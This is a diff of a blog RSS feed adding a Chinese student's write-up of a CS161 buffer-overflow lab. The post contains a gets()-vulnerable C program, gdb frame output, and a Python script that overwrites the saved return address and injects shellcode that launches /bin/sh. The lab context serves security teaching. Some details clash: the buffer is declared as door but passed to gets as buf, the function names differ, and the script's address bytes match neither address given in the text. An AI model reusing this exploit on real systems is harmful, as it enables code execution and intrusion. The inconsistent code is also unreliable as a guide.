@@ -1,4 +1,154 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Cs161 on hengyu</title><link>https://hengyuss.github.io/tags/cs161/</link><description>Recent content in Cs161 on hengyu</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Example Person</copyright><lastBuildDate>Tue, 08 Jul 2025 22:49:21 +0800</lastBuildDate><atom:link href="https://hengyuss.github.io/tags/cs161/index.xml" rel="self" type="application/rss+xml"/><item><title>cs161Day4</title><link>https://hengyuss.github.io/p/cs161day4/</link><pubDate>Tue, 08 Jul 2025 22:49:21 +0800</pubDate><guid>https://hengyuss.github.io/p/cs161day4/</guid><description>&lt;h2 id="攻击">攻击
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Cs161 on hengyu</title><link>https://hengyuss.github.io/tags/cs161/</link><description>Recent content in Cs161 on hengyu</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Example Person</copyright><lastBuildDate>Sun, 13 Jul 2025 22:06:45 +0800</lastBuildDate><atom:link href="https://hengyuss.github.io/tags/cs161/index.xml" rel="self" type="application/rss+xml"/><item><title>Day5</title><link>https://hengyuss.github.io/p/day5/</link><pubDate>Sun, 13 Jul 2025 22:06:45 +0800</pubDate><guid>https://hengyuss.github.io/p/day5/</guid><description>&lt;h3 id="迟来的day5">迟来的day5
+&lt;/h3>&lt;p>已经好几天没有写过相关的总结，有一些我个人原因，也有一些客观原因，主要是以下几条原因&lt;/p>
+&lt;ul>
+&lt;li>新电脑装arch&lt;/li>
+&lt;li>家教代课把时间碎片化了&lt;/li>
+&lt;li>懒！&lt;/li>
+&lt;/ul>
+&lt;p>新买了一个8745h，32g的笔记本，我迫不及待的就装上了arch,虽然之前已经装过几遍了，然后不出所料，又是碰到了一大堆问题。什么？为什么这些问题不总结一下，呃。。。。当时只顾着解决这些问题，很多东西也没办法复现了，（下次一定！）&lt;/p>
+&lt;h3 id="project1-remus">project1-remus
+&lt;/h3>&lt;p>这是cs161projec1的第一个问题，就是将一段shellcode通过gets函数的漏洞注入到计算机中并执行。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">orbit&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">door&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">gets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">orbit&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>漏洞代码如上图所示，所以我们要做的就是找到栈上eip的位置并覆盖它，将它替换为我们注入的shellcode的i地址
+当然第一步是要通过gdb 观察对应变量的地址&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">(gdb) b 5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Breakpoint 1 at 0x4ab: file dejavu.c, line 5.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) run
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting program: /home/whistleblower/dejavu
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Breakpoint 1, deja_vu () at dejavu.c:6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">6 gets(door);
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) print &amp;amp;door
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$1 = (char (*)[8]) 0xbffff928
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) info frame
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Stack level 0, frame at 0xbffff940:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> eip = 0xb7ffc4ab in deja_vu (dejavu.c:6); saved eip = 0xb7ffc4d3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> called by frame at 0xbffff960
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> source language c.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Arglist at 0xbffff938, args:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Locals at 0xbffff938, Previous frame&amp;#39;s sp is 0xbffff940
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Saved registers:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ebp at 0xbffff938, eip at 0xbffff93c
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>通过gdb 我们可以看到door数组的地址在0xbffff928处，该函数的eip存储的位置0xbffff93c处，相20个字节，那我们将这20个字节填充为A, 在0xbffff93c处 覆盖为 4+0xbffff93c = 0xbffff940
+，为什么是这个地址，因为我们将继续向上覆盖，从oxbffff940处就开始输入我们的Shellcode程序了。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">pwnable:~$ cat egg
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#!/usr/bin/env python3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">import codecs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">import sys
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sys.stdout = codecs.getwriter(&amp;#34;latin1&amp;#34;)(sys.stdout.buffer)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OVERWRITER_ADDRESS = &amp;#34;\x3c\xf9\xff\xfb&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SHELLCODE = \
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#39;\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a&amp;#39; \
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#39;\x47\x58\xcd\x80\x31\xc0\x50\x68\x2d\x69&amp;#39; \
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#39;\x69\x69\x89\xe2\x50\x68\x2b\x6d\x6d\x6d&amp;#39; \
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#39;\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f&amp;#39; \
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#39;\x62\x69\x6e\x89\xe3\x50\x52\x51\x53\x89&amp;#39; \
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#39;\xe1\x31\xd2\xb0\x0b\xcd\x80&amp;#39;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">for i in range(0,20):
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> print(&amp;#34;A&amp;#34;, end = &amp;#34;&amp;#34;)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">print(OVERWRITER_ADDRESS, end = &amp;#34;&amp;#34;)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">print(SHELLCODE, end = &amp;#34;&amp;#34;)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>我们只用将这段程序的输出作为第一段C语言程序的输入就可以利用gets函数的漏洞执行这段shellcode了&lt;/p>
+&lt;h3 id="总结">总结
+&lt;/h3>&lt;p>其实这个project1中的小问题主要是让我们了解对于这些栈溢出的漏洞是如何被攻击的，以及了解C中的函数栈格式，同时还有gdb的使用，我现在对gdb的使用还是不太熟练。&lt;/p></description></item><item><title>cs161Day4</title><link>https://hengyuss.github.io/p/cs161day4/</link><pubDate>Tue, 08 Jul 2025 22:49:21 +0800</pubDate><guid>https://hengyuss.github.io/p/cs161day4/</guid><description>&lt;h2 id="攻击">攻击
 &lt;/h2>&lt;h3 id="利用c中的库函数或者系统调用达到攻击的目的">利用C中的库函数或者系统调用达到攻击的目的
 &lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
 &lt;table class="lntable">&lt;tr>&lt;td class="lntd">
